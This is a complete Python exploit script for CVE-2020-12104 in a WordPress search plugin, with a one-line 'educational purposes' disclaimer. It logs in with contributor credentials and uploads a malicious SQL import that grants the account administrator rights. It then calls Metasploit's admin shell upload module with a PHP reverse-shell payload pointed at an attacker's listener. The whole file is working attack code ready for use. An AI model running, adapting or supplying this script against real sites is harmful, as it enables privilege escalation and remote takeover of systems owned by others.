#CVE-2020-12104 
import requests
import sys
import os
#########Change your variables here############
http_s="http://"
target_url="localhost." 
wordpress_path="/wordpress"
login_username="Contributor"
login_password="Contributor"
lhost="0.0.0.0"
lport="1337"
##############Auth with WP#####################
login_data = {"log":login_username,"pwd":login_password,"wp-submit":"Log+In"}
s= requests.Session()
r= s.post(http_s+target_url+wordpress_path+'/wp-login.php',login_data)
auth_cookies=s.cookies.get_dict()
if(r.status_code==200):
	print("[+] Authenticated Successfully")
else:
	print("[+] Authentication Failed")
	exit()
############Elevate User to Admin#############
elevateToAdmin = http_s+target_url+wordpress_path+"/wp-admin/admin-post.php"
#--------Exploit Request from Burp-----------#
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://localhost./wordpress/wp-admin/admin.php?page=WP_Advanced_Search_Callback_ExportImport", "Content-Type": "multipart/form-data; boundary=---------------------------510566301230798596962744707", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
burp0_data = "-----------------------------510566301230798596962744707\r\nContent-Disposition: form-data; name=\"wp_advanced_search_file_import\"; filename=\"WP_Advanced_Search-wordpress-23_04_2020_17h51.sql\"\r\nContent-Type: application/sql\r\n\r\nset @id1 = (select id from wp_users where user_login='"+login_username+"');\r\nUPDATE `wp_usermeta` SET meta_value='a:1:{s:13:\"administrator\";b:1;}' WHERE meta_key LIKE 'wp_capabilities' AND user_id=@id1;\n\r-- ---------------------------------------------------------\n\r\r\n-----------------------------510566301230798596962744707\r\nContent-Disposition: form-data; name=\"wp_advanced_search_import\"\r\n\r\nImport\r\n-----------------------------510566301230798596962744707\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ndb_import\r\n-----------------------------510566301230798596962744707--\r\n"
r=s.post(elevateToAdmin, headers=burp0_headers, data=burp0_data)
if(r.status_code==200):
	print("[+] Elevation to Admin Exploit Completed!")
else:
	print("[+] Exploit Failed")
	exit()
#########Call MSF WP Admin Module ###########
print("[+] Starting MSF wp_admin_shell_upload")
os.system('msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload;\
set PAYLOAD php/reverse_php;\
set VERBOSE true;\
set RHOST '+target_url+';\
set TARGETURI '+wordpress_path+';\
set VHOST '+target_url+';\
set USERNAME '+login_username+';\
set PASSWORD '+login_password+';\
set LHOST '+lhost+';\
set LPORT '+lport+';\
run"')
#disclaimer: for educational purposes only
